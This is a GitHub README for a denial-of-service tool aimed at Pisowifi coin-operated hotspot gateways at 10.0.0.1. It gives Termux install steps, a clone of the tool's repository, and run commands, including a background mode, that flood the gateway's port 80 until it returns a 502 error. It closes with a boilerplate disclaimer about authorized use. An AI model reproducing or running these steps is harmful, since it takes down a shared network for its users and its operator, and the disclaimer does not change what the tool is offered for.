# Pisowifi DDOS
10.0.0.1 = 502 Bad Gateway Error

<div align="center">
<img src="https://github.com/xiv3r/pisowifi-ddos/blob/main/image/proof.png">
</div>

# Requirements
- Termux

# Manual Install
```
pkg update && pkg upgrade -y
```
```
pkg install git python python-pip -y
```
```
git clone https://github.com/xiv3r/pisowifi-ddos.git
```
```
cd pisowifi-ddos
```
```
python ddos.py
```

# Auto Install
```
pkg update && pkg upgrade -y && pkg install git python python-pip -y && git clone https://github.com/xiv3r/pisowifi-ddos.git && cd pisowifi-ddos && python ddos.py
```
# Run
```
cd ~/pisowifi-ddos
```
```
python ddos.py -t 10.0.0.1 -p 80 -t 135
```
> Background mode

```
python ddos.py -t 10.0.0.1 -p 80 -t 135 2>&1 &
```

<div align="center">
<img src="https://github.com/xiv3r/pisowifi-ddos/blob/main/image/ddos.png">
</div>

### Disclaimer
`"This tool is intended solely for ethical cybersecurity purposes, such as penetration testing, vulnerability assessments, and authorized research. Unauthorized use to disrupt networks, services, or systems is illegal and violates cybersecurity laws. Misuse may result in severe legal penalties, including fines and imprisonment. Always obtain explicit permission before testing any system. By using this tool, you agree to comply with all applicable laws and assume full responsibility for your actions."`
